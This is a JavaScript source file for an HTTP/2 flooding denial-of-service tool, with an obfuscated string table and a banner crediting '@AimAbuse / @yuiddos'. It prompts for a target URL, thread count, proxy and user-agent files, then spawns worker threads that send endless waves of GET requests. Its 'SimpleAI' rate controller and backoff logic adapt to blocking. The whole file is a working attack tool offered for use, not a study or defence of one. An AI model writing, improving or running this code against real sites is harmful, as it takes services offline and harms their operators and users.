const _0xb9187 = _0x5734; 
(function(_0x320b3b, _0x154006) { 
    const _0x3fc379 = _0x5734, _0x1f3cfb = _0x320b3b(); 
    while (!![]) { 
        try { 
            const _0x4fdfc1 = parseInt(_0x3fc379(0x71)) / 0x1 * (-parseInt(_0x3fc379(0xa1)) / 0x2) + parseInt(_0x3fc379(0x90)) / 0x3 + -parseInt(_0x3fc379(0x93)) / 0x4 * (-parseInt(_0x3fc379(0x82)) / 0x5) + -parseInt(_0x3fc379(0xab)) / 0x6 + -parseInt(_0x3fc379(0xb4)) / 0x7 * (-parseInt(_0x3fc379(0x6c)) / 0x8) + -parseInt(_0x3fc379(0x9f)) / 0x9 * (-parseInt(_0x3fc379(0xa9)) / 0xa) + -parseInt(_0x3fc379(0x8e)) / 0xb; 
            if (_0x4fdfc1 === _0x154006) break; 
            else _0x1f3cfb['push'](_0x1f3cfb['shift']()); 
        } catch (_0x34e8d0) { 
            _0x1f3cfb['push'](_0x1f3cfb['shift']()); 
        } 
    } 
}(_0x1427, 0x308f7)); 

function _0x1427() { 
    const _0x5832ef = ['authority', 'max', 'AI\x20attack\x20concluded.\x20Total\x20success:\x20', '\x20proxies.', 'response', 'error', 'pathname', 'Enter\x20the\x20duration\x20(seconds):\x20', 'TIMEOUT_MS', '3837064gNkcPY', 'connect', '276081XBayHZ', 'Enter\x20the\x20target\x20URL:\x20', 'question', '132gArJfE', 'request', 'previousSuccessRate', 'Request\x20error:\x20', 'close', ']\x20-\x20', 'defaultMaxListeners', '\x20user\x20agents.', 'INITIAL_CONCURRENT_REQUESTS', 'Invalid\x20arguments.', 'SIGINT', 'then', '618039LEdYvS', 'random', '28ayoDKK', 'GET', '#e600ac', 'origin', 'from', 'Select\x20method\x20(V1,\x20V2,\x20or\x20V3):\x20', 'ceil', 'push', '20UjKDxF', 'Session\x20Stats\x20-\x20Success:\x20', '232296DjEQiz', 'randomBytes', 'all', 'toString', 'Starting\x20attack...', 'message', 'readFileSync', '/path?', 'path', '3017qZqaHy', 'Enter\x20the\x20path\x20for\x20user\x20agent\x20file:\x20', 'RANDOM_DELAY_MIN', 'floor', 'filter', '▓█████▄\x20▓█████▄\x20\x20▒█████\x20\x20\x20\x20██████\x20\x20\x20\x20\x20██▓███\x20\x20\x20▄▄▄\x20\x20\x20\x20\x20\x20\x20███▄\x20\x20\x20\x20█\x20▓█████\x20\x20██▓\x20\x20\x20\x20\x0a▒██▀\x20██▌▒██▀\x20██▌▒██▒\x20\x20██▒▒██\x20\x20\x20\x20▒\x20\x20\x20\x20▓██░\x20\x20██▒▒████▄\x20\x20\x20\x20\x20██\x20▀█\x20\x20\x20█\x20▓█\x20\x20\x20▀\x20▓██▒\x20\x20\x20\x20\x0a░██\x20\x20\x20█▌░██\x20\x20\x20█▌▒██░\x20\x20██▒░\x20▓██▄\x20\x20\x20\x20\x20\x20▓██░\x20██▓▒▒██\x20\x20▀█▄\x20\x20▓██\x20\x20▀█\x20██▒▒███\x20\x20\x20▒██░\x20\x20\x20\x20\x0a░▓█▄\x20\x20\x20▌░▓█▄\x20\x20\x20▌▒██\x20\x20\x20██░\x20\x20▒\x20\x20\x20██▒\x20\x20\x20▒██▄█▓▒\x20▒░██▄▄▄▄██\x20▓██▒\x20\x20▐▌██▒▒▓█\x20\x20▄\x20▒██░\x20\x20\x20\x20\x0a░▒████▓\x20░▒████▓\x20░\x20████▓▒░▒██████▒▒\x20\x20\x20▒██▒\x20░\x20\x20░\x20▓█\x20\x20\x20▓██▒▒██░\x20\x20\x20▓██░░▒████▒░██████▒\x0a\x20▒▒▓\x20\x20▒\x20\x20▒▒▓\x20\x20▒\x20░\x20▒░▒░▒░\x20▒\x20▒▓▒\x20▒\x20░\x20\x20\x20▒▓▒░\x20░\x20\x20░\x20▒▒\x20\x20\x20▓▒█░░\x20▒░\x20\x20\x20▒\x20▒\x20░░\x20▒░\x20░░\x20▒░▓\x20\x20░\x0a\x20░\x20▒\x20\x20▒\x20\x20░\x20▒\x20\x20▒\x20\x20\x20░\x20▒\x20▒░\x20░\x20░▒\x20\x20░\x20░\x20\x20\x20░▒\x20░\x20\x20\x20\x20\x20\x20\x20▒\x20\x20\x20▒▒\x20░░\x20░░\x20\x20\x20░\x20▒░\x20░\x20░\x20\x20░░\x20░\x20▒\x20\x20░\x0a\x20░\x20░\x20\x20░\x20\x20░\x20░\x20\x20░\x20░\x20░\x20░\x20▒\x20\x20░\x20\x20░\x20\x20░\x20\x20\x20\x20\x20░░\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20▒\x20\x20\x20\x20\x20\x20░\x20\x20\x20░\x20░\x20\x20\x20\x20░\x20\x20\x20\x20\x20░\x20░\x20\x20\x20\x0a\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20░\x20░\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20░\x20\x20\x20\x20\x20\x20\x20\x20\x20░\x20\x20\x20\x20░\x20\x20░\x20\x20\x20\x20░\x20\x20░\x20by\x20;\x20@AimAbuse\x20/\x20@yuiddos\x20']; 
    _0x1427 = function() { return _0x5832ef; }; 
    return _0x1427(); 
} 

import puppeteer from 'puppeteer-extra'; 
import puppeteerStealth from 'puppeteer-extra-plugin-stealth'; 
import { Worker, isMainThread, workerData } from 'worker_threads'; 
import http2 from 'http2'; 
import fs from 'fs'; 
import readline from 'readline'; 
import chalk from 'chalk'; 

const config = {
    MAX_RAM_PERCENTAGE: 50,
    TIMEOUT_MS: 10000, // Timeout for requests
    INITIAL_CONCURRENT_REQUESTS: 500,
    MAX_CONCURRENT_REQUESTS: 10000,
    RETRY_LIMIT: 5,
    INITIAL_RETRY_DELAY: 100,
    BACKOFF_FACTOR: 2,
    ERROR_BACKOFF_TIME: 2000,
    RANDOM_DELAY_MIN: 100,
    RANDOM_DELAY_MAX: 1000,
    MAX_REQUESTS_PER_SECOND: 10000
}; 

let workers = [], proxies = [], userAgents = [], totalSuccess = 0, totalFailed = 0, totalResponseTime = 0, protectionDetected = false; 
const target = {}; 

function log(message) { 
    const currentTime = new Date().toISOString(); 
    console.log(chalk.green(`[${currentTime}] ${message}`)); 
} 

const loadProxies = (filePath) => { 
    try { 
        const fileContent = fs.readFileSync(filePath, 'utf-8'); 
        proxies = fileContent.split('\n').filter(Boolean); 
        log(`Loaded ${proxies.length} proxies.`); 
    } catch (error) { 
        console.error('Failed to load proxies:', error.message); 
        process.exit(1); 
    } 
};

const loadUserAgents = (filePath) => { 
    try { 
        const fileContent = fs.readFileSync(filePath, 'utf-8'); 
        userAgents = fileContent.split('\n').filter(Boolean); 
        log(`Loaded ${userAgents.length} user agents.`); 
    } catch (error) { 
        console.error('Failed to load user agents:', error.message); 
        process.exit(1); 
    } 
};

const getRandomProxy = () => { 
    return proxies[Math.floor(Math.random() * proxies.length)]; 
};

const getRandomHeaderValues = () => ({ 
    ':method': 'GET',
    ':authority': target.authority,
    ':scheme': 'https',
    ':path': target.pathname,
    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)]
});

const requestPromise = async (urlObj, retryCount) => { 
    return new Promise((resolve) => { 
        const startTime = Date.now(); 
        const proxy = getRandomProxy(); 
        const headers = getRandomHeaderValues(); 
        const request = urlObj.request(headers); 

        request.on('response', (response) => { 
            totalSuccess++; 
            response.on('data', () => {}); 
            response.on('end', () => { 
                const responseTime = Date.now() - startTime; 
                totalResponseTime += responseTime; 
                resolve(); 
            }); 
        }); 

        request.on('error', async (error) => { 
            totalFailed++; 
            log(`Request error: ${error.message}`); 
            if (retryCount > 0) { 
                await new Promise((resolve) => setTimeout(resolve, config.INITIAL_RETRY_DELAY)); 
                resolve(await requestPromise(urlObj, retryCount - 1)); 
            } else { 
                resolve(); 
            } 
        }); 

        request.end(); 
    }); 
};

class SimpleAI { 
    constructor() { 
        this.adjustmentFactor = 0.1; 
        this.requestRates = [config.INITIAL_CONCURRENT_REQUESTS]; 
    } 

    adjustRequestRate(successes, failures) { 
        const successRate = successes / (successes + failures || 1); 
        if (successRate < this.adjustmentFactor) { 
            const decrease = Math.floor(this.requestRates[this.requestRates.length - 1] * this.adjustmentFactor); 
            const newRate = Math.max(1, this.requestRates[this.requestRates.length - 1] - decrease); 
            this.requestRates.push(newRate); 
        } else { 
            const increase = Math.ceil(this.requestRates[this.requestRates.length - 1] * this.adjustmentFactor); 
            this.requestRates.push(this.requestRates[this.requestRates.length - 1] + increase); 
        } 
        return this.requestRates[this.requestRates.length - 1]; 
    } 
}

const makeRequestV3 = async (targetUrl) => { 
    const urlObject = new URL(targetUrl); 
    target.authority = urlObject.hostname; 
    target.origin = urlObject.origin; 
    target.pathname = urlObject.pathname; 
    const http2Client = http2.connect(target.origin, { timeout: config.TIMEOUT_MS }); 
    const ai = new SimpleAI(); 
    let currentRequestRate = config.INITIAL_CONCURRENT_REQUESTS; 

    try { 
        log('Starting AI-enhanced attack...'); 
        while (true) { 
            const requests = Array.from({ length: currentRequestRate }, () => requestPromise(http2Client, config.RETRY_LIMIT)); 
            await Promise.all(requests); 
            log(`Success: ${totalSuccess}, Failures: ${totalFailed}`); 
            currentRequestRate = ai.adjustRequestRate(totalSuccess, totalFailed); 
            await new Promise((resolve) => setTimeout(resolve, Math.floor(Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN + 1)) + config.RANDOM_DELAY_MIN)); 
        } 
    } catch (error) { 
        log(`Error: ${error.message}`); 
    } finally { 
        http2Client.close(); 
    } 
};

const makeRequest = async (targetUrl) => { 
    const urlObject = new URL(targetUrl); 
    target.authority = urlObject.hostname; 
    target.origin = urlObject.origin; 
    target.pathname = urlObject.pathname; 
    const http2Client = http2.connect(target.origin, { timeout: config.TIMEOUT_MS }); 
    let currentRequestRate = config.INITIAL_CONCURRENT_REQUESTS; 

    try { 
        log('Starting attack...'); 
        while (true) { 
            const requests = Array.from({ length: currentRequestRate }, () => requestPromise(http2Client, config.RETRY_LIMIT)); 
            await Promise.all(requests); 
            log(`Success: ${totalSuccess}, Failures: ${totalFailed}`); 
            if (totalFailed > 0) { 
                log('Warning: Blockage detected, adjusting request strategy.'); 
                currentRequestRate = Math.max(1, currentRequestRate - 1); 
                protectionDetected = true; 
            } else { 
                protectionDetected = false; 
                currentRequestRate += 1; 
            } 
            await new Promise((resolve) => setTimeout(resolve, Math.floor(Math.random() * (config.RANDOM_DELAY_MAX - config.RANDOM_DELAY_MIN + 1)) + config.RANDOM_DELAY_MIN)); 
        } 
    } catch (error) { 
        log(`Error: ${error.message}`); 
    } finally { 
        http2Client.close(); 
    } 
};

if (isMainThread) { 
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout }); 
    const displayWelcomeMessage = () => { 
        console.log(chalk.yellow('Welcome to the AI attack tool!')); 
    }; 

    const promptUser = () => { 
        return new Promise((resolve) => { 
            rl.question('Enter the target URL: ', (url) => { 
                rl.question('Enter the duration (seconds): ', (duration) => { 
                    rl.question('Enter the number of threads: ', (threads) => { 
                        rl.question('Enter the path for proxy file: ', (proxyFilePath) => { 
                            rl.question('Enter the path for user agent file: ', (userAgentFilePath) => { 
                                rl.question('Select method (V1, V2, or V3): ', (method) => { 
                                    rl.close(); 
                                    resolve({ url, duration, threads, proxyFilePath, userAgentFilePath, method }); 
                                }); 
                            }); 
                        }); 
                    }); 
                }); 
            }); 
        }); 
    };

    displayWelcomeMessage(); 
    promptUser().then(async ({ url, duration, threads, proxyFilePath, userAgentFilePath, method }) => { 
        loadProxies(proxyFilePath); 
        loadUserAgents(userAgentFilePath); 
        const parsedDuration = parseInt(duration, 10); 
        const parsedThreads = parseInt(threads, 10); 

        if (isNaN(parsedDuration) || isNaN(parsedThreads) || parsedThreads <= 0 || parsedDuration <= 0) { 
            log(chalk.red('Invalid arguments.')); 
            process.exit(1); 
        } 

        for (let i = 0; i < parsedThreads; i++) { 
            const worker = new Worker(new URL(import.meta.url), { 
                workerData: { url, duration: parsedDuration, proxies, method } 
            }); 
            workers.push(worker); 
        } 

        process.stdin.resume(); 
        process.on('SIGINT', () => { 
            log('Exiting script...'); 
            process.exit(); 
        }); 
    }); 
} else { 
    const { url, method } = workerData; 
    try { 
        method === 'V3' ? await makeRequestV3(url) : await makeRequest(url); 
    } catch (error) { 
        log('Worker encountered an error: ' + error.message); 
    } 
}